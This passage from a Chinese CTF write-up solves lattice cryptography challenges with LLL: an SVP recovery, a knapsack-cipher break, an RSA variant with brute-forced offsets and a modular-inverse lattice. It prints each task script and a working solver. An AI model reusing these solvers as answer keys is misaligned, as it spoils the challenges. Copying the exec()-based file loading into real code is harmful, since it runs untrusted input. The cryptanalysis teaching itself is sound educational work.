class="comment"># Solve SVP.</span></span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步 获得flag</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = (f * c % p) * gmpy2.invert(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535701.png" alt="image-20240719181841549"></p><p>成功获得flag  注意是sage哦</p><h3 id="p2-：背包密码">P2 ：背包密码</h3><p><a href="http://task.py">task.py</a>  注意注释是自己加的,可以根据注释了解一下背包密码加密的大体流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="string">b&#x27;******&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">bin</span>(flag)[<span class="number">2</span>:]   <span class="comment">#转化成二进制</span></span><br><span class="line">n = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成超递增序列a  其中s是所有元素的总和</span></span><br><span class="line">a = [random.randint(<span class="number">1</span>, <span class="number">4</span>**n)]</span><br><span class="line">s = a[<span class="number">0</span>] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">    a.append(random.randint(s+<span class="number">1</span>, <span class="number">4</span>**(n+i)))</span><br><span class="line">    s += a[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成参数m和w</span></span><br><span class="line">m = random.randint(a[-<span class="number">1</span>] + <span class="number">1</span>, <span class="number">2</span>*a[-<span class="number">1</span>])</span><br><span class="line">w = random.randint(<span class="number">1</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据私钥 生成公钥</span></span><br><span class="line">b = [w*i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加密 装入背包</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c = (c + b[i]*<span class="built_in">int</span>(flag[i])) </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>, file=f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>, file=f)</span><br></pre></td></tr></table></figure><p>根据解密格</p><p>跑完后</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535702.png" alt="image-20240720112347201"></p><p>可以发现对格Ge进行LLL之后 这个有无数组值 但是我们需要的是全部为0或者1的一组</p><p>特别需要注意 因为我们在构造格的时候是n+1 多加了一行 所以这一组值选出来之后 要去掉最后的一个数</p><p>在筛选的时候注意提取每一行的元素 有个地方需要注意一下，就是必须转换成列表才能对当前行的每一个元素操作，因为其本身是一个元组，没法提取单个元素</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">M = res.row(i).<span class="built_in">list</span>()   <span class="comment">#提取矩阵第i行转换成列表</span></span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"><span class="built_in">print</span>(res.row(i))</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[33, 184, 123, 68, -41, -182, 171, 330, 115, -108, -160, 252, -31, 163, -79, 96, -36, -90, 264, -174, 52, -43, -272, -129, 73, 7, 134, 75, -65, -272, -181, -42, 126, 69, -159, 52, -263, 45, 10, 13, -103, 161, -61, 47, 54, -77, -13, 124, -209, 204, 148, -85, -85, -62, 192, 84, -47, -99, 175, -338, -107, -45, -415, -245, -228, 125, 187, 267, -9, 170, -172, 39, 99, -47, -136, -80, -58, -87, 96, 161, -133, -18, 199, -245, 6, -46, -9, -110, -70, 17, -91, 68, 111, 44, 8, 40, 11, -12, -9, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="line">(33, 184, 123, 68, -41, -182, 171, 330, 115, -108, -160, 252, -31, 163, -79, 96, -36, -90, 264, -174, 52, -43, -272, -129, 73, 7, 134, 75, -65, -272, -181, -42, 126, 69, -159, 52, -263, 45, 10, 13, -103, 161, -61, 47, 54, -77, -13, 124, -209, 204, 148, -85, -85, -62, 192, 84, -47, -99, 175, -338, -107, -45, -415, -245, -228, 125, 187, 267, -9, 170, -172, 39, 99, -47, -136, -80, -58, -87, 96, 161, -133, -18, 199, -245, 6, -46, -9, -110, -70, 17, -91, 68, 111, 44, 8, 40, 11, -12, -9, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="comment"># 定义一个函数来从文件中读取变量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_variables</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read()</span><br><span class="line">    <span class="comment"># 使用exec将文件内容执行，导入变量</span></span><br><span class="line">    <span class="built_in">exec</span>(file_content, <span class="built_in">globals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数加载变量b 和 c</span></span><br><span class="line">load_variables(<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建格</span></span><br><span class="line">n = <span class="built_in">len</span>(b)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">Ge = Matrix(ZZ, n + <span class="number">1</span>, n + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    Ge[i, i] = <span class="number">1</span>       <span class="comment">#对角线放1</span></span><br><span class="line">    Ge[i, -<span class="number">1</span>] = b[i]   <span class="comment">#每行的最后一个元素</span></span><br><span class="line"></span><br><span class="line">Ge[-<span class="number">1</span>, -<span class="number">1</span>] = -c        <span class="comment">#最右下角的元素</span></span><br><span class="line"></span><br><span class="line">res = Ge.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(res))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#筛选全是0或1的一行</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()   <span class="comment">#提取矩阵第i行转换成列表</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)   <span class="comment">#成功找到全是0或1的</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535703.png" alt="image-20240720114742242"></p><p>上面找到的结果 就是flag的二进制数据 拼起来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, flag))), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p>想要拼接 需要把列表内的东西转化成字符型 才能使用join 最后成功拿到flag</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535704.png" alt="image-20240720120242704"></p><h3 id="p3-：自己构造">p3 ：自己构造</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">a = getPrime(<span class="number">1024</span>)</span><br><span class="line">b = getPrime(<span class="number">1536</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="comment">#观察数据范围 r范围比较小 就几万种可能 也是可以爆破的</span></span><br><span class="line">r = random.randint(<span class="number">2</span>**<span class="number">14</span>, <span class="number">2</span>**<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个值在模下小于50  所以值更小 令式子为x  x可以爆破</span></span><br><span class="line"><span class="keyword">assert</span> ((p-r) * a + q) % b &lt; <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面为推导式</span></span><br><span class="line">((p-r) * a + q) % b = x</span><br><span class="line"><span class="comment">#因为有模数 所以这是在一个有限域中 既然是有限域 就要去掉模符号</span></span><br><span class="line">(p-r) * a + k * b = (x - q) </span><br><span class="line">[[<span class="number">1</span>, a]</span><br><span class="line"> [<span class="number">0</span>, b]]</span><br><span class="line">*</span><br><span class="line">[[(p - r), k]]</span><br><span class="line">=</span><br><span class="line">[[(p-r), (x - q)]]</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">65537</span>, p*q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">c = ...</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造格子</span></span><br><span class="line">Ge = Matrix(ZZ, [[<span class="number">1</span>, a],</span><br><span class="line">                 [<span class="number">0</span>, b]])</span><br><span class="line"></span><br><span class="line">p, q = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#先变成绝对值</span></span><br><span class="line">p, q = <span class="built_in">abs</span>(p), <span class="built_in">abs</span>(q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始爆破</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">14</span>, <span class="number">2</span> ** <span class="number">15</span>)):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        pp = p + r</span><br><span class="line">        qq = q + h</span><br><span class="line">        phi = (pp - <span class="number">1</span>) * (qq - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(phi, <span class="number">65537</span>) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m = power_mod(c, inverse_mod(<span class="number">65537</span>, phi), pp * qq)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;NSSCTF&quot;</span> <span class="keyword">in</span> long_to_bytes(m):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>疑惑点</p><ol><li>p和q的正负 和r与h的关系</li><li>格子的构造 LLL之后结果的含义</li></ol></blockquote><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535705.png" alt="image-20240729175145007"></p><h3 id="p4-：自己构造-本意需要调整一下格的值">P4 ：自己构造 本意需要调整一下格的值</h3><p><a href="http://task.py">task.py</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">175</span>)</span><br><span class="line">a = inverse(r, p)</span><br><span class="line">a = (a*flag) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = ...</span></span><br><span class="line"><span class="string">p = ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先补充一个小知识点</p><p>r的位数是175  非常小 但是其在逆元下，p的位数非常大，所以逆元的结果其位数接近模数p的 1024位左右</p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><msup><mi>r</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>×</mo><mi>m</mi><mo>+</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mi>r</mi><mi>a</mi><mo>+</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>r</mi><mtext>  </mtext><mi>k</mi><mo stretchy="false">)</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>r</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">a=r^{-1} \times m + kp\\m = ra + kp\\(r ~~ k)\left(\begin{matrix}1 &amp; a\\0 &amp; p\\\end{matrix}\right)=\left(\begin{matrix}r &amp; m\\\end{matrix}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.947438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></p><p>Hermite定理测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span> ** <span class="number">0</span>   <span class="comment">#这是不断调整配平用的</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)  <span class="comment">#已知</span></span><br><span class="line">f = flag = getPrime(<span class="number">350</span>)   </span><br><span class="line">r = getPrime(<span class="number">175</span>) </span><br><span class="line"></span><br><span class="line">a = inverse(r, p)</span><br><span class="line"><span class="built_in">print</span>(a.bit_length())  </span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>* <span class="number">2</span>**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值 大于等于下面的即可</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * b * p , <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#bit = (248 + 512) / 2</span></span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#最短向量的值</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*r)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> temp.bit_length() &gt;= temp2.bit_length():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535706.png" alt="image-20240731105516243"></p><p>满足的，所以证明构造这样一个格子就可以了 没有限制界</p><p>exp.sage：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span 